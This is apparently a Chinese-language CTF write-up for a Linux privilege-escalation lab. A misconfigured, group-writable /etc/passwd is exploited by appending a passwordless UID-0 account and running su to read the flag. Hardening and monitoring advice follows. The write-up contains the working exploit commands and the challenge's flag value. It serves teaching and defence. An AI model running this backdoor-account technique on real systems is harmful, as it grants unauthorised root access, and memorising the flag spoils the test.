## 二、题目考点

1. **两个文件的职责分工**：
   - `/etc/passwd`：账户**定义**（`用户名:密码占位:UID:GID:描述:家目录:shell`），历史上存过密码，现在只放占位符 `x`；
   - `/etc/shadow`：真正的**口令 hash** 与有效期策略，只有 `root:shadow` 可读（0640）。
2. **第二字段的语义**：`x` 表示“hash 在 shadow 里”；**空**表示“该账户无密码”，PAM（`pam_unix.so nullok`）会直接放行。
3. **UID 0 = root**：内核只认 uid，不认名字。`/etc/passwd` 里任何一条 `UID=0` 的记录，`su` 过去就是 root。
4. **可写的 passwd ≈ 直接 root**：这是比“shadow 可写”更常见、也更容易被权限批处理脚本搞出来的配置缺陷。
5. **区分“能读 shadow”和“能写 passwd”**：前者是爆破 hash，后者是直接造一个 root 账户，后者成本极低。

## 三、解题过程

### 3.1 第一步：看清两个文件的权限

```bash
id
# uid=1001(player) gid=1001(player) groups=1001(player)

ls -l /etc/passwd /etc/shadow
# -rw-rw-r-- 1 root player 1050 /etc/passwd     <-- 组可写
# -rw-r----- 1 root shadow  652 /etc/shadow     <-- 读不到
```

`player` 私有组就是 `player` 自己的组，所以 **`player` 本人对 `/etc/passwd` 有写权限**。

### 3.2 第二步：确认 shadow 这条路走不通

```bash
cat /etc/shadow
# cat: /etc/shadow: Permission denied

cat /var/backups/passwd.old
# # backup taken 2021: see /var/backups     <-- 里面没有任何 hash
```

### 3.3 第三步：追加一个 UID 0 的空密码账户

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
tail -2 /etc/passwd
# player:x:1001:1001::/home/player:/bin/bash
# pwned::0:0:root:/root:/bin/bash
```

字段拆解：`pwned` | `（空）` | `0` | `0` | `root` | `/root` | `/bin/bash`。
第二字段为空 → 无密码；UID=0 → 与 root 等价。

### 3.4 第四步：su 过去拿 flag

```bash
su pwned -c 'id; cat /flag.txt'
# Password:                （直接回车，空密码）
# uid=0(root) gid=0(root) groups=0(root)
# Ly_Flag{l2ovsu7a}
```

### 4.2 唯一解性说明

| 其他思路 | 实测结果 |
| --- | --- |
| 读 `/etc/shadow` 爆破 hash | 0640 `root:shadow`，`player` 不在 shadow 组 |
| 改 `/etc/shadow` 中 root 的口令 | 无写权限 |
| 从 `/var/backups/passwd.old` 找口令 | 文件里没有 hash |
| `sudo` / SUID / capability | 全部未预置（capability 已实测为空） |

> 注：本题“空密码 + `nullok`”能成立，是因为镜像内 `pam_unix.so` 带 `nullok`（Ubuntu 默认）。迁移到其它基础镜像时必须确认这一行，否则解法需改为“追加带 hash 的账户”。

### 4.3 flag 每题固定（flag.txt）
flag 是**每题一个固定值**：题目目录下的 `flag.txt` 由 Dockerfile `COPY` 到 `/flag.txt`，
再 `chown root:root && chmod 400`。十道题十份文件、内容互不相同；同一题多次构建、多个实例
取值都一致，评分不需要再按实例取 flag。

## 六、修复建议

1. **立刻纠正属性**：`chown root:root /etc/passwd && chmod 644 /etc/passwd`；同理检查 `/etc/shadow`（`root:shadow 0640`）、`/etc/group`、`/etc/gshadow`、`/etc/sudoers`。
2. **盯住“批量修权限”脚本**：这类脚本最容易把 0644/0640 写成 0664/0660；上线前加白名单断言。
3. **完整性监控**：AIDE / `dpkg --verify passwd` / auditd `-w /etc/passwd -p wa`，任何写入告警。
4. **禁止空密码**：`pam_unix.so` 去掉 `nullok`；同时把 `/etc/passwd` 中第二字段为空的历史账户清掉。
5. **账户侧校验**：定期扫 `awk -F: '$3==0' /etc/passwd`，除 `root` 外多出任何一条都要查。

## 七、教学要点

1. `/etc/passwd` 定义账户，`/etc/shadow` 保存 hash —— 记住这两个文件的分工，就能一眼看出“组可写”意味着什么。
2. 第二字段 `x` = 去 shadow 找；**空** = 无密码；这两者的区别是本题解法的关键。
3. UID 是权限的唯一判据：名字叫 `pwned` 还是 `admin` 不影响它是不是 root。
4. 遇到“权限批量修复”类场景描述，第一反应就是去 `ls -l /etc/*` 看那几个核心文件的 mode。
5. 修复思路是“恢复默认属性 + 持续监控”，而不是删掉被加进去的那一行。
